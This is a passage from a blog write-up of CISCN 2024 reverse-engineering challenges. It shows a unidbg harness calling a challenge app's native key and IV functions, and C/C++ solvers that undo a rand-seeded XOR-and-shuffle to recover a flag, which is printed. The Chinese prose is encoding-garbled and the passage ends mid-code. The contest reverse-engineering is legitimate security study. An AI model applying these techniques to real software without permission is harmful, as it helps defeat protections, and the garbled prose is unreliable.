class="hljs-keyword">return</span> object1.getValue().toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">func_getiv</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        DvmObject&lt;?&gt; object1 = object.callJniMethodObject(emulator, <span class="hljs-string">&quot;getiv()Ljava/lang/String;&quot;</span>);<br>        <span class="hljs-keyword">return</span> object1.getValue().toString();<br>    &#125;<br><br>    <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª main å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1ã€éœ€è¦è°ƒç”¨çš„ so æ–‡ä»¶æ‰€åœ¨è·¯å¾„</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">soFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/root/Documents/unidbg/unidbg-android/src/test/java/com/ciscn/libSecret_entrance.so&quot;</span>;<br><br>        <span class="hljs-comment">// 2ã€APK çš„è·¯å¾„</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">apkFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/root/Documents/unidbg/unidbg-android/src/test/java/com/ciscn/app-debug.apk&quot;</span>;<br>        <span class="hljs-comment">// 3ã€apk è¿›ç¨‹å</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">apkProcessname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.tencent.testvuln&quot;</span>;<br>        <span class="hljs-type">ciscna</span> <span class="hljs-variable">myapp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ciscna</span>(apkFilePath, soFilePath, apkProcessname);<br>        System.out.println(<span class="hljs-string">&quot;getKeyresult:&quot;</span> + myapp.func_getKey());<br>        System.out.println(<span class="hljs-string">&quot;getivresult:&quot;</span> + myapp.func_getiv());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719932052605-98d3f447-02f7-41a4-b7e0-6e89e5699929.png" class="" title="img"><h2 id="gdb-debug-1"><a href="#gdb-debug-1" class="headerlink" title="gdb_debug-1"></a>gdb_debug-1</h2><p>ä¼ªéšæœºæ•°åªå–é«˜ä½</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716100016457-d5481475-f8ea-43e2-b819-86c868e5b319.png" class="" title="img"><p>xor rand-&gt;äº¤æ¢ä¸‹æ ‡-&gt;xor rand-&gt;xor string</p><p>æŒ‰ç†seedç”Ÿæˆçš„ä¼ªéšæœºæ•°ä¼šå¾ˆå¤§ï¼Œä¸è°ƒè¯•ç»“æœä¸ç¬¦ï¼Œè¿™ä¹Ÿå°±æ˜¯é¢˜ç›®è¦æ±‚æˆ‘ä»¬è°ƒè¯•çš„åŸå› </p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716167594042-41d86583-b18e-488e-8cc3-f237b629b4b1.png" class="" title="img"><p>ä¸€ç§æ€è·¯æ˜¯è¾“å…¥ä¸€ä¸ªflagï¼Œå¾—åˆ°å¯†æ–‡ä¹‹åxorå¾—åˆ°rand1,rand3å’Œptrï¼Œå½“ç„¶å¯ä»¥ä¸€ä½ä½æå–æ•°æ®</p><p>çœ‹æ±‡ç¼–å»æ‰¾æŠŠraxä½œä¸ºåœ°å€çš„å†…å­˜ï¼Œè®°ä½å¼€å§‹ä½ç½®åç›´æ¥è·³å‡ºå¾ªç¯ï¼Œå…¨éƒ¨æå–ï¼Œè¿™é¢˜ç¥å¥‡çš„ç‚¹åœ¨åŒå‡»æ•°ç»„è¿›å»çœ‹ä¸åˆ°å¯†æ–‡</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1717032099911-a550afe9-f6d5-4131-8eef-2fc7e7d25596.png" class="" title="img"><p>è€Œéœ€è¦åœ¨è°ƒè¯•æ—¶çœ‹çœ‹å¯„å­˜å™¨çš„å€¼æ‰¾å†…å­˜</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1717032257002-26d3e2ce-bb4b-4cde-a71d-e71a73b9307d.jpeg" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> v28[<span class="hljs-number">38</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> a[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x20000000</span>, <span class="hljs-number">0x30000000</span>, <span class="hljs-number">0x40000000</span>, <span class="hljs-number">0x50000000</span>, <span class="hljs-number">0x60000000</span>, <span class="hljs-number">0x70000000</span>, <span class="hljs-number">0x80000000</span>, <span class="hljs-number">0x90000000</span>, <span class="hljs-number">0xa0000000</span>, <span class="hljs-number">0xb0000000</span>, <span class="hljs-number">0xc0000000</span>, <span class="hljs-number">0xd0000000</span>, <span class="hljs-number">0xe0000000</span>, <span class="hljs-number">0xf0000000</span>&#125;;<br>        srand(a[i]);<br>        <span class="hljs-type">int</span> v31[<span class="hljs-number">38</span>] = &#123;<span class="hljs-number">220</span>, <span class="hljs-number">184</span>, <span class="hljs-number">64</span>, <span class="hljs-number">189</span>, <span class="hljs-number">156</span>, <span class="hljs-number">201</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">239</span>, <span class="hljs-number">18</span>, <span class="hljs-number">216</span>, <span class="hljs-number">152</span>, <span class="hljs-number">105</span>, <span class="hljs-number">208</span>, <span class="hljs-number">222</span>, <span class="hljs-number">252</span>, <span class="hljs-number">107</span>, <span class="hljs-number">174</span>, <span class="hljs-number">125</span>, <span class="hljs-number">139</span>, <span class="hljs-number">214</span>, <span class="hljs-number">141</span>, <span class="hljs-number">15</span>, <span class="hljs-number">208</span>, <span class="hljs-number">79</span>, <span class="hljs-number">102</span>, <span class="hljs-number">62</span>, <span class="hljs-number">157</span>, <span class="hljs-number">250</span>, <span class="hljs-number">195</span>, <span class="hljs-number">233</span>, <span class="hljs-number">36</span>, <span class="hljs-number">211</span>, <span class="hljs-number">239</span>, <span class="hljs-number">255</span>, <span class="hljs-number">157</span>, <span class="hljs-number">231</span>, <span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">int</span> rand1[<span class="hljs-number">38</span>]=&#123;<span class="hljs-number">217</span>, <span class="hljs-number">15</span>, <span class="hljs-number">24</span>, <span class="hljs-number">189</span>, <span class="hljs-number">199</span>, <span class="hljs-number">22</span>, <span class="hljs-number">129</span>, <span class="hljs-number">190</span>, <span class="hljs-number">248</span>, <span class="hljs-number">74</span>, <span class="hljs-number">101</span>, <span class="hljs-number">242</span>, <span class="hljs-number">93</span>, <span class="hljs-number">171</span>, <span class="hljs-number">43</span>, <span class="hljs-number">51</span>, <span class="hljs-number">212</span>, <span class="hljs-number">165</span>, <span class="hljs-number">103</span>, <span class="hljs-number">152</span>, <span class="hljs-number">159</span>, <span class="hljs-number">126</span>, <span class="hljs-number">43</span>, <span class="hljs-number">93</span>, <span class="hljs-number">194</span>, <span class="hljs-number">175</span>, <span class="hljs-number">142</span>, <span class="hljs-number">58</span>, <span class="hljs-number">76</span>, <span class="hljs-number">165</span>, <span class="hljs-number">117</span>, <span class="hljs-number">37</span>, <span class="hljs-number">180</span>, <span class="hljs-number">141</span>, <span class="hljs-number">227</span>, <span class="hljs-number">123</span>, <span class="hljs-number">163</span>, <span class="hljs-number">100</span>&#125;;<br>        <span class="hljs-type">int</span> rand3[<span class="hljs-number">38</span>]=&#123;<span class="hljs-number">222</span>, <span class="hljs-number">170</span>, <span class="hljs-number">66</span>, <span class="hljs-number">252</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">178</span>, <span class="hljs-number">6</span>, <span class="hljs-number">13</span>, <span class="hljs-number">147</span>, <span class="hljs-number">97</span>, <span class="hljs-number">244</span>, <span class="hljs-number">36</span>, <span class="hljs-number">73</span>, <span class="hljs-number">21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">215</span>, <span class="hljs-number">171</span>, <span class="hljs-number">4</span>, <span class="hljs-number">24</span>, <span class="hljs-number">207</span>, <span class="hljs-number">233</span>, <span class="hljs-number">213</span>, <span class="hljs-number">150</span>, <span class="hljs-number">51</span>, <span class="hljs-number">202</span>, <span class="hljs-number">249</span>, <span class="hljs-number">42</span>, <span class="hljs-number">94</span>, <span class="hljs-number">234</span>, <span class="hljs-number">45</span>, <span class="hljs-number">60</span>, <span class="hljs-number">148</span>, <span class="hljs-number">111</span>, <span class="hljs-number">56</span>, <span class="hljs-number">157</span>, <span class="hljs-number">88</span>, <span class="hljs-number">234</span>&#125;;<br>        <span class="hljs-type">char</span> ptr[<span class="hljs-number">38</span>]=&#123;<span class="hljs-number">0x12</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x21</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">38</span>; i++) &#123;<br>            v31[i] = v31[i] ^ rand3[i];<br>            <span class="hljs-comment">//printf(&quot;%d &quot;,rand());</span><br>            <span class="hljs-comment">//ptr[i] = i;</span><br>        &#125;<br><br>        <span class="hljs-comment">// for (int k = 37; k; --k) &#123;</span><br>        <span class="hljs-comment">// int v18 = rand() % 38;</span><br>        <span class="hljs-comment">// //printf(&quot;%d &quot;,v18);</span><br>        <span class="hljs-comment">// int tmp = ptr[k];</span><br>        <span class="hljs-comment">// ptr[k] = ptr[v18];</span><br>        <span class="hljs-comment">// ptr[v18] = tmp;</span><br>        <span class="hljs-comment">// &#125;</span><br>        <span class="hljs-comment">//printf(&quot;\n&quot;);</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;<span class="hljs-number">38</span>; i++) &#123;<br>            v28[ptr[i]] = v31[i];<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">38</span>; i++) &#123;<br>            v28[i] = v28[i] ^ rand1[i];<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">38</span>; i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v28[i]&amp;<span class="hljs-number">0xff</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;ï¿½8bace5989660ee38f1fd980a4b4fbcd&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€åä¸€ä½çˆ†ç ´å³å¯ï¼š<code>flag&#123;78bace5989660ee38f1fd980a4b4fbcd&#125;</code></p><p>è¿˜æœ‰ä¸€ç§æ˜¯ç›´æ¥ç”¨æ—¶é—´æˆ³ï¼Œæ³¨æ„è¦åœ¨linuxä¸‹è¿è¡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cctype&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">double</span> DD;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(((<span class="hljs-type">int</span>)<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>))&amp; <span class="hljs-number">0xF0000000</span>);<br>    <span class="hljs-type">char</span> s2[] = <span class="hljs-string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> byte_10A0[] = &#123;<br>    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x88</span>, <br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4D</span>, <br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span><br>&#125;;<br>    <span class="hljs-type">char</span> rand1[<span class="hljs-number">38</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rand2[<span class="hljs-number">38</span>],rand3[<span class="hljs-number">38</span>];<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(s2);<br>    cout &lt;&lt; <span class="hljs-string">&quot;len:&quot;</span> &lt;&lt; len &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            rand1[i] = <span class="hljs-built_in">rand</span>();<br>            <span class="hljs-comment">// cout &lt;&lt; (unsigned int)(rand1[i]&amp;0xff) &lt;&lt; &quot; &quot;;</span><br>        &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=len<span class="hljs-number">-1</span>;i;--i)<br>        &#123;<br>            rand2[i] = <span class="hljs-built_in">rand</span>()%(i+<span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// cout &lt;&lt; (unsigned int)(rand2[i]&amp;0xff) &lt;&lt; &quot; &quot;;</span><br>        &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            rand3[i] = <span class="hljs-built_in">rand</span>();<br>        &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            s2[i] ^= byte_10A0[i];<br>        &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            s2[i] ^= rand3[i];<br>        &#125;<br><br>    <span class="hljs-type">int</span> str3[<span class="hljs-number">39</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            str3[i] = i;<br>        &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=len<span class="hljs-number">-1</span>;i;--i)<br>        &#123;<br>            <span class="hljs-type">int</span> temp = str3[i];<br>            str3[i] = str3[rand2[i]];<br>            str3[rand2[i]] = temp;<br>        &#125;<br><br>    <span class="hljs-comment">//s2[i]=str2[str3[i]];</span><br>    <span class="hljs-type">char</span> str2[<span class="hljs-number">39</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            str2[str3[i]] = s2[i];<br>        &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            str2[i] ^= rand1[i];<br>        &#125;<br>    cout &lt;&lt; str2;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//-22 61 13 92</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ªäººæ¯”èµ›çš„æ—¶å€™å°±ç”¨äº†è¿™ç§ï¼Œä½†æ˜¯rand2çš„ç”Ÿæˆå¾ªç¯å†™åäº†ï¼Œä»¥åŠrand1å’Œrand3çš„ä½ç½®æ²¡è€ƒè™‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> v28[<span class="hljs-number">38</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-comment">//int a[16]=&#123;0,0x10000000,0x20000000,0x30000000,0x40000000,0x50000000,0x60000000,0x70000000,0x80000000,0x90000000,0xa0000000,0xb0000000,0xc0000000,0xd0000000,0xe0000000,0xf0000000&#125;;</span><br>        srand(((<span class="hljs-type">int</span>)time(<span class="hljs-number">0</span>))&amp;<span class="hljs-number">0xf0000000</span>);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> v31[<span class="hljs-number">38</span>]=&#123;<span class="hljs-number">220</span>, <span class="hljs-number">184</span>, <span class="hljs-number">64</span>, <span class="hljs-number">189</span>, <span class="hljs-number">156</span>, <span class="hljs-number">201</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">239</span>, <span class="hljs-number">18</span>, <span class="hljs-number">216</span>, <span class="hljs-number">152</span>, <span class="hljs-number">105</span>, <span class="hljs-number">208</span>, <span class="hljs-number">222</span>, <span class="hljs-number">252</span>, <span class="hljs-number">107</span>, <span class="hljs-number">174</span>, <span class="hljs-number">125</span>, <span class="hljs-number">139</span>, <span class="hljs-number">214</span>, <span class="hljs-number">141</span>, <span class="hljs-number">15</span>, <span class="hljs-number">208</span>, <span class="hljs-number">79</span>, <span class="hljs-number">102</span>, <span class="hljs-number">62</span>, <span class="hljs-number">157</span>, <span class="hljs-number">250</span>, <span class="hljs-number">195</span>, <span class="hljs-number">233</span>, <span class="hljs-number">36</span>, <span class="hljs-number">211</span>, <span class="hljs-number">239</span>, <span class="hljs-number">255</span>, <span class="hljs-number">157</span>, <span class="hljs-number">231</span>, <span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">char</span> s[<span class="hljs-number">50</span>]=<span class="hljs-string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;<br>        <span class="hljs-type">int</span> ptr[<span class="hljs-number">38</span>];<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rand1[<span class="hljs-number">38</span>];<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rand2[<span class="hljs-number">38</span>];<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rand3[<span class="hljs-number">38</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)&#123;<br>            rand1[i]=rand();<br>            <span class="hljs-comment">//printf(&quot;%d &quot;,rand1[i]);</span><br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">37</span>;i++)&#123;<br>            rand2[i]=rand();<br>            <span class="hljs-comment">//printf(&quot;%d &quot;,rand2[i]);</span><br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)&#123;<br>            rand3[i]=rand();<br>            <span class="hljs-comment">//printf(&quot;%d &quot;,rand3[i]);</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)&#123;<br>            v31[i]=v31[i]^rand3[i];<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,rand3[i]);<br>            ptr[i]=i;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">37</span>,j=<span class="hljs-number">0</span>;k&gt;=<span class="hljs-number">0</span>;k--,j++)&#123;<br>            <span class="hljs-type">uint32_t</span> t=rand2[j]%(k+<span class="hljs-number">1</span>);<br>            <span 